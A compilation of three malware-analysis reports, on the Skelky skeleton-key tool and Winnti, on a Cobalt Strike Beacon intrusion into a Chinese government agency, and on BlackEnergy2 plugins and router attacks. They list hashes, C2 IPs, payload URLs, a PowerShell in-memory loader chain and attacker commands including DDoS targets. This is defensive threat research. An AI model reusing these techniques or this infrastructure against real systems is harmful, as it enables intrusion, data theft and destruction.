Log into your ThreatConnect account or register for one via our Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market .
Backdoor.Winnti attackers have a skeleton in their closet ?
New evidence suggests that the skeleton key malware , known as Trojan.Skelky , could be linked to the Backdoor.Winnti malware family .
By : Gavin O GormanSymantec Employee Created 29 Jan 2015 Contributor : Nikolas Tsapkis On January 12 , 2015 , Dell Secureworks blogged about a tool ( Trojan.Skelky ) that allows attackers to â€œuse a password of their choosing to authenticate as any user.â€ The Skelky ( from skeleton key ) tool is deployed when an attacker gains access to a victimâ€™s network ; the attackers may also utilize other tools and elements in their attack .
Symantec has analyzed Trojan.Skelky and found that it may be linked to the Backdoor.Winnti malware family .
The attackers behind the Trojan.Skelky campaign appear to have been using the malware in conjunction with this back door threat .
Itâ€™s unclear if the malware family Backdoor.Winnti is used by one attack group or many groups .
During our research , we also found that Trojan.Skelky has been active over the past two years .
Within this timeframe , we have seen new variants and a consistent hashed password value .
Where is Trojan.Skelky being used ?
1 of 3 .
Symantec telemetry identified the skeleton key malware on compromised computers in five organizations with offices in the United States and Vietnam .
The exact nature and names of the affected organizations is unknown to Symantec .
The first activity was seen in January 2013 and until November 2013 , there was no further activity involving the skeleton key malware .
In November 2013 , the attackers increased their usage of the tool and have been active ever since .
Four more variants of Trojan.Skelky were discovered as well as additional file names used by the attackers .
The complete set of observed file names and hashes are listed as follows .
msuta64.dll : 66da7ed621149975f6e643b4f9886cfd ole64.dll : bf45086e6334f647fda33576e2a05826 HookDC64.dll : bf45086e6334f647fda33576e2a05826 HookDC.dll : a487f1668390df0f4951b7292bae6ecf HookDC.dll : 8ba4df29b0593be172ff5678d8a05bb3 HookDC.dll : f01026e1107b722435126c53b2af47a9 ole64.dll : f01026e1107b722435126c53b2af47a9 olex64.dll : f01026e1107b722435126c53b2af47a9 HookDC64.dll : f01026e1107b722435126c53b2af47a9 ole.dll : f01026e1107b722435126c53b2af47a9 HookDC.dll : 747cc5ce7f2d062ebec6219384b57e8c ole.dll : 747cc5ce7f2d062ebec6219384b57e8c .
The link between Trojan.Skelky and Backdoor.Winnti .
From the first observed use of the tool in January 2013 to the present , the attackers have consistently used the same password .
This is the case with three different variants of the tool .
The regular use of the same password across multiple variants means itâ€™s likely that only one group of attackers has been using the tool until at least January 2015 .
By identifying any other malware active on compromised computers at the same time as Trojan.Skelky , it is possible to learn more about the attackers .
There were almost no signs of other malware active at the same time as Skelky in most of the organizations investigated .
However , two compromised computers had other malware present , active , and in the same directory , at the same time as Trojan.Skelky .
Two files were discovered on one of the victimâ€™s computers .
One file is a variant of Backdoor.Winnti ( jqs.exe ) and the other is a dropper for Backdoor.Winnti ( tmp8296.tmp ) , which is responsible for creating the Backdoor.Winnti sample .
Details on the file names and hashes are as follows :
jqs.exe ( Backdoor.Winnti dropper ) : 600b604784594e3339776c6563aa45a1 tmp8296.tmp ( Backdoor.Winnti variant ) : 48377c1c4cfedebe35733e9c3675f9be .
Backdoor.Winnti has been used in the past in a number of different campaigns , most notably against Asian games companies .
Given the disparate nature of some victims , itâ€™s unclear if the malware is used by one set of attackers , or many .
Symantec is continuing its investigation into this malware familyBackdoor.Winnti and the specific actors behind the combined use of Backdoor.Winnti and Trojan.Skelky .
2 of 3 .
Symantec and Norton protection .
Symantec and Norton products have the following protections against the skeleton key malware : AV Trojan.Skelky Customers with Behaviour-Based Protection enabled are protected with the signature SONAR.Module ! gen3 .
3 of 3 .
ANALYSIS ON APT-TO-BE ATTACK THAT FOCUSING ON CHINA 'S GOVERNMENT AGENCY .
Antiy CERT First release time : 14:32 , May 27 , 2015 Updated time of this version : 14:32 , May 27 , 2015 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Contents 1 BACKGROUND .
1 2 ANALYSIS ON INCIDENT SAMPLE .
1 2.1 LEADING FILES AND SAMPLE DOWNLOADING .
1 2.2 KEY MECHANISM .
3 2.3 ANALYSIS ON THE MAJOR SAMPLE ( SAMPLE B ) OF APT-TOCS .
3 2.4 ANALYSIS ON SCRIPT 1 .
3 2.5 ANALYSIS ON MODULE 1 .
4 2.6 ANALYSIS ON MODULE 2 .
5 2.7 ANALYSIS ON MODULE 3 .
6 3 THE AUTHENTICATION ANALYSIS ON THE TECHNOLOGY SOURCES OF THIS ATTACK .
7 3.1 COMPARISON OF MODULE 1 .
8 3.2 COMPARISON OF DISASSEMBLING COMMANDS OF MODULE 2 .
9 3.3 COMPARISON ANALYSIS ON MODULE 3 DATA PACKAGE .
10 3.4 CHARACTERISTICS OF COBALT STRIKE .
11 4 CONCLUSION 11 APPENDIX 1 REFERENCES OF COBALT STRIKE AND THE AUTHOR 12 APPENDIX 2 ABOUT ANTIY 16 .
© Antiy Labs .
All rights reserved .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
1 Background .
Recently , ANTIY Labs detected an APT attack targeting some government agency in China .
The Shellcode for communication is conducted depending on Beacon mode which is generated on the basis of automatic attack detection platform-Cobalt Strike .
This kind of attack pattern disguising as non-malicious real file in the host of its target , it sending a network heartbeat package every 60 seconds , and it also send data information via the Cookie field , all these features of this attack pattern are designed to evade the detection of security software and the interception of firewall on the targeted host .
Considering the relationship between this attack and Cobalt Strike platform , we name it as APT-TOCS ( TOCS refers to Threat on Cobalt Strike . ) for now .
The core step of APT-TOCS is downloading the script functionalities of Shellcode , which downloads a field of data into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is generated by Cobalt Strike ( An automatic attack testing platform ) .
After loading the script of Shellcode , the Analysis Group of ANTIY did a series of correlation analysis , then we found a PE program that maybe act as a guiding executable file in similar attacks .
The loaded Shellcode script can be used to call command line to add a certain field of encrypted date into memory and run it .
The decrypted date turns out to be executable Shellcode which is generated by Cobalt Strike .
The related script can be loaded via the guiding PE program or vulnerability .
This kind of attack pattern has several features which including running in memory , no hard disk writing operations , communicating via Beacon , multi-beacon communication is acceptable , and several Beacons can work simultaneously .
Such attack can be launched without the support of vector file , in fact it depends on network projection and laterally move in the internal network as required conducting an attack .
So , it will bring great difficulties to the forensic work .
It is important to note that , all the Sandboxes we know are disabling to fight against this kind of attack .
It seems that the attack capability of APT-TOCS is close to that of APT-level .
However , it relied on automatic attack testing platform instead of abilities of the attack team .
2 Analysis on incident sample .
2.1 Leading files and sample downloading APT-TOCS used “ powershell.exe ” to execute Shellcode scripts to realize remote control on targeted system .
The analysts of Antiy thought that the attacker might know several remote injection methods of script downloading privilege , such as directly making the scrip be executed on the host by using security vulnerabilities .
Meanwhile , we found the following binary leading attack files ( hereinafter referred to as Sample A ) were used in similar attacks before :
Virus name Trojan/Win32.MSShell Original file name ab.exe MD5 44BCF2DD262F12222ADEAB6F59B2975B Processor structure X86 File size 72.0 KB ( 73,802 bytes ) .
© Antiy Labs .
All rights reserved .
Page 1 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
File format BinExecute/Microsoft.EXE [ : X86 ] Time Stamp 2009-05-10 07:02:12 Digital signature NO Shell type Unknown Compilation language Microsoft Visual C++ .
The functionality code of the scripts embedded in this PE sample is completely the same with the one of Shellcode script Antiy has acquired , while the encryption data of them differs from each other .
This PE sample was firstly uploaded to Virustotal on May 2 , 2015 :
Figure 1 Downloading encryption data using powershell.exe embedded in PE files .
The PE sample used WinExec to operate embedded malware :
Figure 2 Using function WinExec to call powershell.exe to download leading data .
Therefore , we can see that the “ leading file ” can be regarded as the leading part of attack .
However , the execution and control still can be made depending on system and application vulnerabilities without this leading file .
According to above information , we can not make sure this leading sample has relationship with this APT incident .
© Antiy Labs .
All rights reserved .
Page 2 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
2.2 Key mechanism The core part of APT-TOCS relies on the encrypted data scripts ( hereinafter referred to as Sample B ) downloaded by PowerShell .
Figure 1 consists of various derivation relationships and major module functionalities :
Figure 3 Various derivation relationships and major module functionalities .
2.3 Analysis on the major sample ( Sample B ) of APT-TOCS The content ( Here omitted the content of base64 . ) of Sample B is as follows :
Figure 4 Content of Sample B .
The functionality of this part of script is : decrypting the encrypted content of base64 , decompressing with Gzip , resulting in module 1 and using PowerShell to download and execute .
2.4 Analysis on script 1 The content of script 1 is as follows :
© Antiy Labs .
All rights reserved .
Page 3 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Figure 5 Content of script 1 .
The functionality of this part is : decrypting data with base64 encryption and getting module 1 , then writing to process powershell.exe , and executing and operating .
2.5 Analysis on module 1 The functionality of this module is as follows : calling the function of wininet module , connecting the network , downloading operations of module 2 ; and executing by downloading to the memory .
© Antiy Labs .
All rights reserved .
Page 4 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Figure 6 Request of HTTP GET .
Figure 6 shows that using request of HTTP GET to get file : http://146.0.43.107/hfYn .
2.6 Analysis on module 2 Module 2 established and listed system process rundll32.exe :
Figure 7 Establishing and listing process rundll32.exe .
Data that has been written into module 3 :
Figure 8 Data that has been written into module 3 .
© Antiy Labs .
All rights reserved .
Page 5 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Though the data of module 3 started with “ MZ ” , it does not belong to PE files .
Instead , it is the Shellcode with backdoor functionality .
Figure 9 Shellcode that started with MZ（4D 5A） .
2.7 Analysis on module 3 The module might connect the following 2 addresses with port 80 :  146.0. * * * . * * * ( Romania )  dc . * * * * * * 69.info ( 146.0. * * * . * * * ) ( Romania ) Sending request data and receiving return data .
Figure 10 Sending request data .
The decryption to above IP , domains and accessing addresses is “ XOR 0x69 ” .
Judging from the module strings and the system functions , the module belongs to backdoor program that can send GET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds ’ interval .
The heartbeat package data includes : check code , process ID , system version , IP address , computer name , account , whether it is 64 bit process .
Then it transmits by making use of both RSA and BASE64 encryption .
© Antiy Labs .
All rights reserved .
Page 6 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Figure 11 The original data of heartbeat package .
As the process ID and check code are different , the transmitted heartbeat package data are different each time .
The check code is calculated through using process ID and the millisecond process during system startup .
The algorithm is as follows :
Figure 12 Algorithm of check code .
The encrypted heartbeat package used Cookie field to transmit :
Figure 13 Content of the data package .
3 The authentication analysis on the technology sources of this attack The leading PE files , Sample_A and Sample B , associated by analysts of Antiy CERT used the exactly same method of PowerShell .
However , we can not eliminate the possibility that Sample_A has no positive connection with this attack due to the high standardization of relevant scripts .
We still consider it as a series of attack incidents based on other comprehensive analysis .
The attacker might exploit the following ways to control the target host , such as social engineering e-mails , file bundling , exploiting system and application vulneratbilities , lateral .
© Antiy Labs .
All rights reserved .
Page 7 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
movement of intranet and so on .
We found “ Beacon ” strings when analyzing “ Module 1 ” .
According to existed experience , we doubted that Shellcode is closely related with automatic attack testing platform Cobalt Strike .
Therefore , our analysts carried out comparison analysis on Beacon generated by Cobalt Strike , and authenticated the relationships between them .
Cobalt Strike is the GUI framework penetration tool based on metasploit .
The business version of it integrates the following characteristics : service scan , automatic overflow , multi-mode port espionage , various Trojan generation , phishing attack , site clone , target information obtaining , automatic browser attack and so on .
3.1 Comparison of Module 1 We compared module 1 and the payload generated by using Beacon , and found only the following different data : the Head data , request file name and IP address .
Figure 14 Comparison of Module 1 .
The left is sample module 1 , while the right is the module generated by Beacon .
We can lead to the conclusion from the comparison : module 1 is generated by Beacon .
The screenshot of data package in request is as follows :
© Antiy Labs .
All rights reserved .
Page 8 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Figure 15 The data package comparison of module 1 .
3.2 Comparison of disassembling commands of module 2 Our analysts compared sample module 2 and relevant files of Beacon , and found that the disassembling commands between them are exactly the same with exception of functionality code , including XOR encryption at the entry , downloading system DLL , obtaining function address , function calling modes and so on .
The following lists three points .
Sample module 2 Relevant Beacon files XOR decry ption at t he entry ( Using x86 /shikata_g a_nai ) .
© Antiy Labs .
All rights reserved .
Page 9 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
The decrypted code at the entry Function calls .
3.3 Comparison analysis on module 3 data package The following figure is the GET request comparison of the module generated by sample module 3 and Beacon .
Here we can see both of them use Cookie to transmit information that has been encrypted , and send requests actively every 60 seconds .
The data package is heartbeat .
© Antiy Labs .
All rights reserved .
Page 10 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
Figure 16 Comparison of module 3 data package .
3.4 Characteristics of Cobalt Strike Using Cobalt Strike attack can execute various operations in the targeted systems , such as downloading and uploading files , executing designated programs , injecting keyboard recorder , executing commands via PowerShell , importing PowerShell script , executing commands via CMD , accessing system passwords and so on .
Cobalt Strike has the following characteristics :
 Penetrating sandbox  Avoiding whitelist mechanism and cloud detection  Intranet penetration  Persistent attacks  Attacking various platforms .
4 Conclusion .
With an automated test platform Cobalt Strike , the attack penetration can penetrate firewall , the approach the attackers used to control targeted host is covert and undetectable ; what ’ s more , it can attack various platforms , such .
© Antiy Labs .
All rights reserved .
Page 11 .
Analysis on APT-to-be Attack That Focusing on China 's Government Agency .
as Windows , Linux , Mac etc . ; it ’ s formidable adversary to Trusted Computing , Cloud Detection , Sandbox Detection and so on .
According to the traces in the past , we believe that the threat has been active for 5 years ; unfortunately , there isn ’ t any powerful detection production and methods to defeat the malicious attack till now .
The reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it ’ s a kind of targeted attack ( one of the features of APT attack ) , it has anti-detection functions and also it can conceal itself .
Compared with APT incidents in the past , the APT attack in this case doesn ’ t cost too much , and the attackers aren ’ t responsible for coding .
With the application of commercial attack platform , the attackers saved the cost of an attack , also the vulnerability built joint function provided by relevant attack platform make the attackers easy to do injection .
As a result , nations and organizations which without its own elite hacker groups and abundant capital can also launch some kind of APT attack via the attack pattern mentioned in this case .
Meanwhile , it ’ s more difficult for us to tracing when facing such modeled attack .
One of the leaders in Information Security area-Bruce Schiner said , “ when big events on information security happened , people tend to treat it as an example of cyber warfare .
It ’ s ridiculous .
From my point of view , what ’ s happening and going to happen is : more and more tactics in physical warfare are applied to cyber warfare .
It ’ s important to note that , attack capabilities can be widely distributed if attackers take full advantages of certain technology , especially computer technology can make attack more powerful and automated . ” Obviously , highly automated commercial platform realized a high speed of spread of this attack capability ( exceeded our anticipation ) .
We have to remind all relevant parties that we are confronting with the risk of large scale diffusion of network armaments which is led by the low cost of the attack capability .
The commercial penetration attack detecting platform has two sides , on one hand , it can check the network environment of systems effectively , on the other hand , for nations , organizations and industries which has limited budget , it costs too much .
Given the situation , all related parties should conduct more communication with each other , additionally , there is no doubt that both offensive party and defensive party are supported by superpowers , these superpowers should prevent the attack technique from widely distributing .
The incident mentioned there has no difference with other cases we detected in the past , it shows that , on the way to realize national informatizaion , we must fight against serious security challenges as we confronting now ; it ’ s also a good opportunity for our Chinese people and enterprises to demonstrate our faith and the efforts we made to conquer the challenge .
BE2 Custom Plugins , Router Abuse , and Target Profiles .
The BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year .
An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms , scripts for Cisco network devices , destructive plugins , a certificate stealer and more .
Here , we present available data it is difficult to collect on this APT .
We will also present more details on targets previously unavailable and present related victim profile data .
These attackers are careful to hide and defend their long-term presence within compromised environments .
The malware 's previously undescribed breadth means attackers present new technical challenges in unusual environments , including SCADA networks .
Challenges , like mitigating the attackers ' lateral movement across compromised network routers , may take an organization 's defenders far beyond their standard routine and out of their comfort zone .
Brief History .
BlackEnergy2 and BlackEnergy3 are known tools .
Initially , cybercriminals used BlackEnergy custom plugins for launching DDoS attacks .
There are no indications of how many groups possess this tool .
BlackEnergy2 was eventually seen downloading more crimeware plugins a custom spam plugin and a banking information stealer custom plugin .
Over time , BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor .
While another crimeware group continues to use BlackEnergy to launch DDoS attacks , the BE2APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own .
To be clear , our name for this actor has been the BE2APT , while it has been called `` SandwormTeam `` also .
The Plugins and Config Files .
Before evidence of BlackEnergy2 use in targeted attacks was uncovered , we tracked strange activity on one of the BlackEnergy CnC servers in 2013 .
This strangeness was related to values listed in newer BlackEnergy configuration files .
As described in Dmitry 's 2010 Black DDoS ' analysis , a configuration file is downloaded from the server by main.dll on an infected system .
The config file provides download instructions for the loader .
It also instructs the loader to pass certain commands to the plugins .
In this particular case in 2013 , the config file included an unknown plugin set , aside from the usual 'ddos ' plugin listing .
Displayed below are these new , xml formatted plugin names `` weap_hwi '' , `` ps '' , and `` vsnet '' in a BlackEnergy configuration file download from a c2 server .
This new module push must have been among the first for this group , because all of the module versions were listed as `` version 1 '' , including the ddos plugin :
Config downloaded from BE2 server .
The 'ps ' plugin turned out to be password stealer .
The 'vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .
Most surprising was the 'weap_hwi ' plugin .
It was a ddos tool compiled to run on ARM systems :
Weap_hwi plugin .
At first , we did n't know whether the ARM plugin was listed intentionally or by mistake , so we proceeded to collect the CnC 's config files .
After pulling multiple config files , we confirmed that this ARM object inclusion was not a one-off mistake .
The server definitely delivered config files not only for Windows , but also for the ARM/MIPS platform .
Though unusual , the ARM module was delivered by the same server and it processed the same config file .
Linux plugins .
Over time we were able to collect several plugins as well as the main module for ARM and MIPS architectures .
All of these ARM/MIPS object files were compiled from the same source and later pushed out in one config : `` weap_msl '' , `` weap_mps '' , `` nm_hwi '' , `` nm_mps '' , `` weap_hwi '' , and `` nm_msl '' .
It 's interesting that the BE2 developers upgraded the ddos plugin to version 2 , along with the nm_hwi , nm_mps , and nm_msl plugins .
They simultaneously released version 5 of the weap_msl , weap_mps , and weap_hmi plugins .
Those assignments were not likely arbitrary , as this group had developed BlackEnergy2 for several years in a professional and organized style :
Config with a similar set of plugins for different architectures .
Here is the list of retrieved files and related functionality :
weap DDoS Attack ( various types ) password stealer handling a variety of network protocols ps ( SMTP , POP3 , IMAP , HTTP , FTP , Telnet ) nm scans ports , stores banners snif logs IP source and destination , TCP/UDP ports main module : CnC communication , config parser , plugins hook loader uper rewrites hook module with a new version and launches it .
Weap , Snif , Nm plugin grammar mistakes and mis-spellings .
The developers ' coding style differed across the 'Hook ' main module , the plugins , and the Windows main.dll .
The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure .
This structure obfuscation may be a rewrite effort to better modularize the code , but could also be intended to complicate analysis .
Regardless , it is likely that different individuals coded the different plugins .
So , the BE2 effort must have its own small team of plugin and multiplatform developers .
Hook module structure .
After decrypting the strings , it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules :
The CNC 's IP address in the Linux module .
This Linux module can process the following commands , some of which are similar to the Windows version :
die delete all BlackEnergy2 files and system traces kill delete all BlackEnergy2 files and system traces and reboot lexec launch a command using bin/sh rexec download and launch file using 'fork/exec ' update rewrite self file migrate update the CnC server .
Windows Plugins .
After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs .
During an extended period , we were able to collect many Windows plugins from different CnC servers , without ever noticing Linux plugins being downloaded as described above .
It appears the BE2/SandWorm gang protected their servers by keeping their non-Windows hacker tools and plugins in separate servers or server folders .
Finally , each CnC server hosts a different set of plugins , meaning that each server works with different victims and uses plugins based on its current needs .
Here is the summary list of all known plugins at the moment :
searches for given file types , gets primary system and network fs information ps password stealer from various sources ss makes screenshots spreads payload in the local network ( uses psexec , accesses admin vsnet shares ) , gets primary system and network information rd remote desktop scan scans ports of a given host grc backup channel via plus.google.com file infector ( local , shares , removable devices ) with the given payload jn downloaded from CnC cert certificate stealer logs traffic , extracts login-passwords from different protocol ( HTTP , sn LDAP , FTP , POP3 , IMAP , Telnet ) tv sets password hash in the registry for TeamViewer prx Proxy server Destroys hard disk by overwriting with random data ( on application level dstr and driver level ) at a certain time kl keylogger upd BE2 service file updater gathers information on connected USBs ( Device instance ID , drive usb geometry ) bios gathers information on BIOS , motherboard , processor , OS .
We are pretty sure that our list of BE2 tools is not complete .
For example , we have yet to obtain the router access plugin , but we are confident that it exists .
Evidence also supports the hypothesis that there is a decryption plugin for victim files ( see below ) .
Our current collection represents the BE2 attackers ' capabilities quite well .
Some plugins remain mysterious and their purpose is not yet clear , like 'usb ' and 'bios ' .
Why would the attackers need information on usb and bios characteristics ? It suggests that based on a specific USB and BIOS devices , the attackers may upload specific plugins to carry out additional actions .
Perhaps destructive , perhaps to further infect devices .
We do n't know yet .
It 's also interesting to point out another plugin – 'grc ' .
In some of the BE2 configuration files , we can notice an value with a `` gid '' type :
The addr number in the config .
This number is an ID for the plus.google.com service and is used by the 'grc ' plugin to parse html .
It then downloads and decrypts a PNG file .
The decrypted PNG is supposed to contain a new CNC address , but we never observed one .
We are aware of two related GooglePlus IDs .
The first one , plus.google.com/115125387226417117030/ , contains an abnormal number of views .
At the time of writing , the count is 75 million :
BE2 plus profile .
The second one plus.google.com/116769597454024178039/posts is currently more modest at a little over 5,000 views .
All of that account 's posts are deleted .
Tracked Commands .
During observation of the described above `` router-PC '' CnC we tracked the following commands delivered in the config file before the server went offline .
Our observation of related actions here :
u ps start password stealing ( Windows ) Ps_mps/ps_hwi start start password stealing ( Linux , MIPS , ARM ) rewrite hook module with a new version and launch it uper_mps/uper_hwi start ( Linux , MIPS , ARM ) Nm_mps/nm_hwi start – Scan ports and retrieve banners on the router subnet ban middle ( Linux , MIPS , ARM ) U fsget * 7 * .docx , * .pdf , search for docs with the given filetypes ( Windows ) * .doc * retrieve information on installed programs and launch S sinfo commands : systeminfo , tasklist , ipconfig , netstat , route table , trace route to google.com ( Windows ) weap_mps/weap_hwi host188.128.123.52 DDoS on 188.128.123.52 ( Linux , MIPS , ARM ) port [ 25,26,110,465,995 ] typetcpconnect weap_mps/weap_hwi typesynflood port80 DDoS on 212.175.109.10 ( Linux , MIPS , ARM ) cnt100000 spdmedium host212.175.109.10 .
The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices .
We want to pay special attention to the DDoS commands meant for these routers .
188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior 's government site .
While many researchers suspect a Russian actor is behind BE2 , judging by their tracked activities and the victim profiles , it 's still unclear whose interests they represent .
While observing some other CnCs and pulling down config files , we stumbled upon some strange mistakes and mis-typing .
They are highlighted in the image below :
BE2 config file mistakes .
First , these mistakes suggest that the BE2 attackers manually edit these config files .
Secondly , it shows that even skilled hackers make mistakes .
Hard-Coded Command and Control .
The contents of the config files themselves are fairly interesting .
They all contain a callback c2 with a hardcoded ip address , some contain timeouts , and some contain the commands listed above .
We include a list of observed hardcoded ip C2 addresses here , along with the address owner and geophysical location of the host :
C2 IP address Owner Country 184.22.205.194 hostnoc.net US 5.79.80.166 Leaseweb NL 46.165.222.28 Leaseweb NL 95.211.122.36 Leaseweb NL 46.165.222.101 Leaseweb NL 46.165.222.6 Leaseweb NL 89.149.223.205 Leaseweb NL 85.17.94.134 Leaseweb NL 46.4.28.218 Hetzner DE 78.46.40.239 Hetzner DE 95.143.193.182 Serverconnect SE 188.227.176.74 Redstation GB 93.170.127.100 Nadym RU 37.220.34.56 Yisp NL 194.28.172.58 Besthosting.ua UA 124.217.253.10 PIRADIUS MY 84.19.161.123 Keyweb DE 109.236.88.12 worldstream.nl NL 212.124.110.62 digitalone.com US 5.61.38.31 3nt.com DE 5.255.87.39 serverius.com NL .
It 's interesting that one of these servers is a Tor exit node .
And , according to the collected config files , the group upgraded their malware communications from plain text http to encrypted https in October 2013 .
BE2 Targets and Victims .
BlackEnergy2 victims are widely distributed geographically .
We identified BlackEnergy2 targets and victims in the following countries starting in late 2013 .
There are likely more victims .
Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden .
Victim profiles point to an expansive interest in ICS :
power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors .
However , we also noticed that the target list includes government , property holding , and technology organizations as well :
high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high-tech transportation academic research .
Victim cases .
We gained insight into significant BE2 victim profiles over the summer of 2014 .
Interesting BE2 incidents are presented here .
Victim # 1 .
The BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE , and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable .
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension .
BE2 spearphish example .
The attached exe file turned out to be 'BlackEnergy-like ' malware , which researchers already dubbed 'BlackEnergy3 ' the gang uses it along with BlackEnergy2 .
Kaspersky Lab detects 'BlackEnergy3 ' malware as Backdoor.Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first-stage tool on this network .
The config files within BE2 contained the settings of the company 's internal web proxy :
BE2 config file contains victim 's internal proxy .
As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in-memory ) , the administrators were able to collect BE2 files from the infected machines .
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .
By all appearances , the attackers pushed the 'dstr ' module when they understood that they were revealed , and wanted to hide their presence on the machines .
Some machines already launched the plugin , lost their data and became unbootable .
Desstructive dstr command in BE2 config file .
Also , on some machines , documents were encrypted , but no related plugin could be found .
Victim # 2 .
The second organization was hacked via the first victim 's stolen VPN credentials .
After the second organization was notified about the infection they started an internal investigation .
They confirmed that some data was destroyed on their machines , so the BE2 attackers have exhibited some level of destructive activity .
And , they revealed that their Cisco routers with different IOS versions were hacked .
They were n't able to connect to the routers any more by telnet and found the following `` farewell '' tcl scripts in the router 's file system : Ciscoapi.tcl – contains various wrappers over cisco EXEC-commands as described in the comments .
The comment includes a punchy message for `` kasperRsky '' :
BE2 ciscoapi.tcl fragment .
Killint.tcl – uses Ciscoapi.tcl , implements destroying functions :
BE2 killint.tcl fragment .
The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them , and unfortunately could n't restore them after they were deleted .
The BE2 actor performs careful , professional activity covering their tracks :
ciscoapi.tcl killint.tcl telnetapi2.tcl telnetu.tcl stub.tcl stub1.tcl .
There is evidence that the logs produced by some scripts were also stored on the FTP server , in particular the information on CDP neighbors which is provided by one of the procedures of ciscoapi.tcl .
Victim # 3 .
The third organization got compromised by the same type of attack as the first one ( an EXE file spoofing a doc within a Zip archive ) .
All the plugins discovered in BE2 files were known , and there was no revelation of hacked network devices on their side and no destroyed data .
The noticeable thing is that many computers contained both BE2 and BE3 files and some config files contained the following URL : http://46.165.222.28/upgrade/f3395cd54cf857ddf8f2056768ff49ae/getcfg.php The URL contains the md5 of the string 'router ' .
One of the discovered config files contained a URL with an as yet unidentified md5 : http://46.165.222.28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php .
Victim set # 4 .
A set of victims discovered installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy .
Starting in March 2014 and ending in July 2014 , Siemens `` ccprojectmgr.exe '' downloaded and executed a handful of different payloads hosted at 94.185.85.122/favicon.ico .
They are all detected as variants of `` Backdoor.Win32.Blakken '' .
Build IDs .
Each config file within BE2 main.dll has a field called build_id which identifies the malware version for the operators .
Currently this particular BE/SandWorm gang uses a certain pattern for the build ids containing three hex numbers and three letters , as follows : 0C0703hji The numbers indicate the date of file creation in the format : Year-Month-Day .
Still , the purpose of the letters is unknown , but most likely it indicates the targets .
The hex numbers were n't used all the time , sometimes we observed decimal numbers : 100914_mg 100929nrT Most interesting for us was the earliest build id we could find .
Currently it is `` OB020Ad0V '' , meaning that the BE2/SandWorm APT started operating as early as the beginning of 2010 .
Appendix : IoC .
While BE dropper installs its driver under a randomly picked non-used Windows driver name , like % system32 % \drivers\AliIde.sys .
The driver is self-signed on 64-bit systems However , new `` APT '' BE2 uses one of the following filenames that are used as an encrypted storage for plugins and the network settings .
They are consistent and serve as stable IoC :
% system32 % \drivers\winntd_.dat % system32 % \drivers\winntd.dat % system32 % \drivers\wincache.dat % system32 % \drivers\mlang.dat % system32 % \drivers\osver32nt.dat % LOCALAPPDATA % \adobe\wind002.dat % LOCALAPPDATA % \adobe\settings.sol % LOCALAPPDATA % \adobe\winver.dat % LOCALAPPDATA % \adobe\cache.dat .
BE2 also uses start menu locations for persistence : Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\flashplayerapp.exe BE3 uses the following known filenames : % USERPROFILE % \NTUSER.LOG % LOCALAPPDATA % \FONTCACHE.DAT BE2 MD5s :
